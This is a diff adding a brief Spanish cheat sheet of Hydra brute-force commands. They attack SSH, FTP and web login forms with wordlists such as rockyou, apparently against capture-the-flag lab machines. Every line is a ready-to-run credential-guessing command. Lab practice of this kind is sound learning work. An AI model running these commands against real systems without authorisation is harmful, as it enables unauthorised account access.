@@ -1,0 +1,22 @@
+hydra:
+-l : usuario
+-p ruta diccionario
+-t hilos
+
+hydra ssh y ftp:
+hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 6 ssh://<IP Addr>
+hydra -l lin -P diccionario-con palabras.txt -t6 ftp://10.10.141.63
+
+hydra fuerza bruta login post:
+^USER^ / ^PASS^
+hydra -l USUARIO -P DICIONARIO.TXT IP https-post-form "RUTA:TEXTO-PAGINA:MENSAJE INCORRECTO" 
+
+hydra -l USUARIO -P DICCIONARIO 10.10.62.150 -V http-form-post  
+
+hydra -l milesdyson -P log1.txt 10.10.62.150 -V http-form-post   
+"/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown User or password incorrect."
+
+hydra -l admin -P rockyou.txt 10.10.190.215 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V
+
+hydra fuerza bruta login:
+hydra -l bob -P /usr/share/wordlists/rockyou.txt -f 10.10.96.170 http-get /protected
